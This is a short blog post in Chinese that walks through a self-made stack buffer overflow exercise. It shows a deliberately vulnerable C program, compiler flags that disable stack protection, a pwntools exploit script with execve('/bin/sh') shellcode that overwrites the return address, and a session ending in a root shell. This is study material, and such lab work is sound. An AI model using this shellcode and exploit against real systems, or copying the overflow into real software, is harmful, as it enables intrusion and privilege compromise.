---
layout: post
title: "buffer_overflow"
date: 2015-08-29 06:47:10 -0700
comments: true
categories: 
---

0x00 a.c漏洞程序

	#include<stdio.h>
	void vul()
	{
		char buf[50];
		printf("%p\n", buf);
		fflush(stdout);
		read(0, buf, 100);
	}
	int main()
	{
		puts("hello");
		fflush(stdout);
		vul();
		return 0;
	}

0x01 编译
	gcc -fno-stack-protector -z execstack -g a.c

0x02 exp脚本


	from pwn import *

	p = remote("127.0.0.1", 6666)
	#p = process("./a.out")

	print p.readuntil("hello\n0x")

	#get_addr
	jump_addr = p.read(8)
	print "jump_addr:%s"% jump_addr
	jump_addr = p32( int("0x" + jump_addr, 16) )

	shellcode  = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
	shellcode += "A" * (0x3a - len(shellcode))
	shellcode += "bbbb"    		#ebp
	shellcode += jump_addr		#eip
	p.sendline( shellcode)

	p.interactive()

0x03 得到shell

	root@jackpelf-VirtualBox:/home/jackpelf/stack# python exp.py
	[+] Starting program './a.out': Done
	hello
	0x
	jump_addr:bfd352ce
	[*] Switching to interactive mode

	$ whoami
	root
	$  
